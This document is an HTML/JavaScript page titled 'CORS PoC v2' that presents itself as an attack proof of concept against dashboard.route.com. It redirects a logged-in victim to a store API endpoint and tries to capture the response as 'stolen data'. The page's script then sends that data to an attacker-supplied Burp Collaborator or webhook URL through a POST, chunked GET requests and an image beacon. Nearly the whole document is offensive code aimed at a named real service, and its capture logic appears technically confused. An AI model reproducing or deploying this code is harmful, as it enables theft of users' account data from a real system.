<!DOCTYPE html>
<html>
<head>
    <title>CORS PoC v2</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 600px;
            margin: 50px auto;
            padding: 20px;
            background: #1a1a1a;
            color: #fff;
        }
        h1 {
            color: #00ff00;
            border-bottom: 2px solid #00ff00;
            padding-bottom: 10px;
        }
        .version {
            color: #00ff00;
            font-size: 12px;
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin: 20px 0 5px 0;
            color: #00ff00;
        }
        input {
            width: 100%;
            padding: 10px;
            background: #2a2a2a;
            border: 1px solid #00ff00;
            color: #fff;
            font-size: 14px;
        }
        button {
            width: 100%;
            padding: 15px;
            margin-top: 20px;
            background: #00ff00;
            color: #000;
            border: none;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }
        button:hover {
            background: #00cc00;
        }
        .status {
            margin-top: 20px;
            padding: 15px;
            background: #2a2a2a;
            border-left: 4px solid #00ff00;
            display: none;
        }
        .status.show {
            display: block;
        }
    </style>
</head>
<body>
    <h1>üéØ CORS Attack PoC</h1>
    <div class="version">Version 2.0 - Silent Background Redirect</div>
    
    <label>üîó Collaborator URL:</label>
    <input type="text" id="collab" value="https://your-id.burpcollaborator.net" placeholder="Enter your Burp Collaborator or webhook URL">
    
    <button onclick="attack()">‚ö° EXECUTE ATTACK</button>
    
    <div id="status" class="status"></div>

    <script>
        // Global vars
        var RETURN_URL = window.location.href.split('#')[0]; // Current page URL
        
        function attack() {
            var collab = document.getElementById('collab').value;
            
            if (!collab || collab.includes('your-id')) {
                alert('‚ö†Ô∏è Please set your collaborator URL first!');
                return;
            }
            
            // Store collaborator URL
            localStorage.setItem('collabURL', collab);
            localStorage.setItem('returnURL', RETURN_URL);
            localStorage.setItem('attackActive', 'true');
            
            showStatus('üöÄ Initiating silent redirect...');
            
            // Quick redirect to API (will be invisible/fast)
            setTimeout(function() {
                window.location.href = 'https://dashboard.route.com/api/mn/v1/stores';
            }, 500);
        }

        function showStatus(msg) {
            var status = document.getElementById('status');
            status.textContent = msg;
            status.className = 'status show';
        }

        // ===== AUTO-CAPTURE ON API PAGE =====
        (function() {
            var isAPIPage = window.location.hostname === 'dashboard.route.com' && 
                           window.location.pathname.includes('/api/');
            
            if (!isAPIPage) {
                // We're on the attacker page - check if we have stolen data
                checkForStolenData();
                return;
            }

            // We're on the API page! Grab data and redirect back IMMEDIATELY
            var attackActive = localStorage.getItem('attackActive');
            var returnURL = localStorage.getItem('returnURL');
            
            if (!attackActive || !returnURL) {
                return; // Not our attack
            }

            console.log('On API page, capturing data...');
            
            // Get the data
            var stolenData = document.body.innerText || document.body.textContent;
            
            // Store it (compress if needed)
            try {
                localStorage.setItem('stolenData', stolenData);
                console.log('Data stored, redirecting back...');
            } catch(e) {
                // Data too large for localStorage, truncate
                console.log('Data too large, truncating...');
                localStorage.setItem('stolenData', stolenData.substring(0, 50000));
            }
            
            // Mark attack as complete
            localStorage.setItem('attackActive', 'false');
            
            // Redirect back to attacker page IMMEDIATELY
            window.location.href = returnURL + '#captured';
        })();

        // ===== CHECK FOR STOLEN DATA =====
        function checkForStolenData() {
            // Check if we just came back from API
            if (window.location.hash === '#captured') {
                var stolenData = localStorage.getItem('stolenData');
                var collabURL = localStorage.getItem('collabURL');
                
                if (!stolenData) {
                    showStatus('‚ùå No data captured. Make sure you are logged in to dashboard.route.com');
                    return;
                }

                // Remove hash from URL
                history.replaceState(null, null, ' ');
                
                showStatus('‚úÖ Data captured! Processing...');
                
                // ALERT 1: Show the stolen data
                setTimeout(function() {
                    alert('üéâ STOLEN DATA CAPTURED!\n\n' + stolenData.substring(0, 500) + '\n\n... [truncated]\n\nTotal length: ' + stolenData.length + ' characters');
                    
                    // Send to collaborator
                    exfiltrateData(stolenData, collabURL);
                    
                    // ALERT 2: Confirm sent
                    setTimeout(function() {
                        alert('‚úÖ SUCCESS!\n\nData sent to:\n' + collabURL + '\n\nCheck your Burp Collaborator now!');
                        showStatus('‚úÖ Attack complete! Data sent to collaborator.');
                        
                        // Clean up
                        localStorage.removeItem('stolenData');
                        localStorage.removeItem('attackActive');
                    }, 500);
                }, 500);
            }
        }

        function exfiltrateData(data, collab) {
            console.log('Sending to collaborator:', collab);
            
            // Method 1: POST
            fetch(collab, {
                method: 'POST',
                mode: 'no-cors',
                headers: {'Content-Type': 'text/plain'},
                body: data
            }).then(function() {
                console.log('‚úÖ POST sent');
            }).catch(function(e) {
                console.log('‚ùå POST failed:', e);
            });
            
            // Method 2: GET (chunked if needed)
            var chunkSize = 2000;
            for (var i = 0; i < Math.min(3, Math.ceil(data.length / chunkSize)); i++) {
                var chunk = data.substring(i * chunkSize, (i + 1) * chunkSize);
                fetch(collab + '?chunk=' + i + '&data=' + encodeURIComponent(chunk), {
                    mode: 'no-cors'
                }).catch(function(e) {
                    console.log('‚ùå GET chunk failed:', e);
                });
            }
            
            // Method 3: Image beacon
            var img = new Image();
            img.src = collab + '/img?length=' + data.length + '&preview=' + encodeURIComponent(data.substring(0, 500));
            
            console.log('‚úÖ All exfiltration methods triggered');
        }

        // Auto-check on page load
        window.addEventListener('load', function() {
            checkForStolenData();
        });
    </script>
</body>
</html>
